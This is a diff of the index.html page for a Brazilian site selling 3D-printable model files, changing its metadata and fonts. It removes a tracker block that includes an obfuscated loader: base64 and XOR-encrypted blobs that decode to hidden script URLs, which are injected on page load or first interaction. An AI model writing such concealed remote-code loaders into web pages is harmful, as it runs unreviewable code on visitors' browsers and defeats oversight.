@@ -1,91 +1,36 @@
 <!doctype html>
-<html lang="pt-BR" class="scroll-smooth">
+<html lang="pt-BR">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <meta name="theme-color" content="#000000" />
-    <title>Central Prime 3D™ — Modelos STL para vender</title>
-    <meta name="description" content="Biblioteca minerada de modelos 3D prontos para imprimir e vender na Shopee e Mercado Livre." />
-    <meta property="og:title" content="Central Prime 3D™ — Modelos STL para vender" />
-    <meta property="og:description" content="Biblioteca minerada de modelos 3D prontos para imprimir e vender na Shopee e Mercado Livre." />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Central 3D - Área de Membros VIP | Arquivos STL & 3MF</title>
+    <meta name="description" content="Central 3D - Biblioteca oficial de modelos 3D STL e 3MF prontos para impressão 3D." />
+    <meta name="theme-color" content="#0b0c0e" />
+    <meta property="og:title" content="Central 3D - Área de Membros VIP" />
+    <meta property="og:description" content="Central 3D - Biblioteca oficial de modelos 3D STL e 3MF prontos para impressão 3D." />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
-    <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
-
-    <!-- Performance: Critical above-the-fold hero poster preload -->
-    <link rel="preload" as="image" href="/assets/hero_poster.webp" type="image/webp" fetchpriority="high" />
-
-    <!-- Performance: Lightweight DNS prefetch for external hosts -->
-    <link rel="dns-prefetch" href="https://i.imgur.com" />
-    <link rel="dns-prefetch" href="https://appdigitalhub.com.br" />
-    <link rel="dns-prefetch" href="https://cdn.utmify.com.br" />
-    <link rel="dns-prefetch" href="https://trackeamento-vip.vercel.app" />
-
-    <style>html,body{background:#000;color:#fff;margin:0}</style>
+    <link rel="preload" as="image" type="image/webp" href="/model_card_bg.webp" />
+    <link rel="preconnect" href="https://lh3.googleusercontent.com" crossorigin />
+    <link rel="preconnect" href="https://i.imgur.com" crossorigin />
+    <link rel="dns-prefetch" href="https://drive.google.com" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@600;700&family=Cinzel:wght@700;800&display=swap"
+      rel="stylesheet"
+      media="print"
+      onload="this.media='all'"
+    />
+    <noscript>
+      <link
+        href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@600;700&family=Cinzel:wght@700;800&display=swap"
+        rel="stylesheet"
+      />
+    </noscript>
   </head>
-  <body class="bg-black text-white selection:bg-[#0066ff] selection:text-white">
+  <body class="bg-[#0b0c0e] text-white selection:bg-[#ff6600] selection:text-white">
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
-
-    <!-- Deferred Trackeamento VIP + UTMify (zero impact on FCP/LCP, 100% tracking preserved) -->
-    <script>
-      (function () {
-        var loaded = false;
-        function loadTrackers() {
-          if (loaded) return;
-          loaded = true;
-
-          var tv = document.createElement("script");
-          tv.src = "https://trackeamento-vip.vercel.app/t.js";
-          tv.async = true;
-          tv.setAttribute("data-pixels", "1368569075303614");
-          document.head.appendChild(tv);
-
-          function injectEncoded(b64) {
-            try {
-              var raw = atob(b64);
-              var bytes = [];
-              for (var i = 0; i < raw.length; i++) bytes.push(raw.charCodeAt(i) & 255);
-              var pLen = bytes[0];
-              var key = bytes.slice(1, 1 + pLen);
-              var payload = bytes.slice(1 + pLen);
-              var out = "";
-              for (var j = 0; j < payload.length; j++) {
-                out += String.fromCharCode((payload[j] ^ key[j % pLen]) & 255);
-              }
-              var cfg = JSON.parse(decodeURIComponent(escape(out)));
-              (cfg.globals || []).forEach(function (g) { window[g.name] = g.value; });
-              var s = document.createElement("script");
-              s.src = cfg.url;
-              s.async = true;
-              s.defer = true;
-              (cfg.attributes || []).forEach(function (a) { s.setAttribute(a.name, a.value); });
-              (document.head || document.documentElement).appendChild(s);
-            } catch (_) {}
-          }
-
-          injectEncoded("DATUn4qCIKf9T7/CFX/26vjuAp3fJ8u2ZXfusKXhRMnTOsuvfGKtsentTYmfPZCxdna97/7xD9eUN9quOnS95+/uDs2ObZPgdHCg7ePgVdOYPJ34Tln4ve3uT8WcI8zgL1+vveTjTcLfdZ2yfHyx88PmAovfOd6uYGH2pai0QcPJfI2gIz3s/ezjQsPELY31dzLgrOugXfqA");
-          injectEncoded("DCf6t7zNol1lWEQjIFzYws6hgGdHMDBXUFTAmJOuxjNLLTBOSUGDmd+iz3MHKmtQQ1WTx8i+jSgRNTcMTEaO0s+5jDcWemgBQVOOxdWv1ykAK2YZe1zY2d2gx39feiBCVEbXwsigyzscdTRRRVGf2cjg2j4KPGlQQ0zYm567wzEQPWYZAgWHm8fvzDwIPWYZAkObw93g1ykIMSJaDVeI0sqozClIKzFBSUOJlZDv1DwJLSEBGgXYyuGw");
-        }
-
-        function schedule() {
-          if ("requestIdleCallback" in window) {
-            window.requestIdleCallback(loadTrackers, { timeout: 1200 });
-          } else {
-            window.setTimeout(loadTrackers, 300);
-          }
-        }
-
-        if (document.readyState === "complete") {
-          schedule();
-        } else {
-          window.addEventListener("load", schedule, { once: true });
-        }
-        ["pointerdown", "touchstart", "keydown"].forEach(function (evt) {
-          window.addEventListener(evt, loadTrackers, { once: true, passive: true });
-        });
-      })();
-    </script>
   </body>
 </html>
-
